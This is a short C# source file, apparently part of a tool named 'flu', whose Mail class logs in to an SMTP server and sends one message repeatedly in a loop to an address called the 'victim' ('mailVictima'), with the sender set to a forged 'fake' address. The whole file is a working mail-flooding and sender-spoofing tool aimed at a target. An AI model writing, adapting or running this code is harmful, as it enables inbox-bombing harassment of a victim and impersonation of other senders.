using System.Net;
using System.Net.Mail;

namespace flu;

internal class Mail
{
	private SmtpClient server;

	private string mailVictima;

	private string mailFake;

	private string text;

	private string subject;

	public Mail(string mailServer, string emailOrigen, string pass, string emailVictima, string emailFake, string asunto, string texto)
	{
		server = new SmtpClient(mailServer);
		server.Credentials = new NetworkCredential(emailOrigen, pass);
		server.EnableSsl = true;
		mailVictima = emailVictima;
		mailFake = emailFake;
		text = texto;
		subject = asunto;
	}

	public void sendMail(int n)
	{
		MailMessage mailMessage = new MailMessage();
		mailMessage.Subject = subject;
		mailMessage.To.Add(new MailAddress(mailVictima));
		mailMessage.From = new MailAddress(mailFake, mailFake);
		mailMessage.Body = text;
		for (int i = 0; i < n; i++)
		{
			server.Send(mailMessage);
		}
	}
}
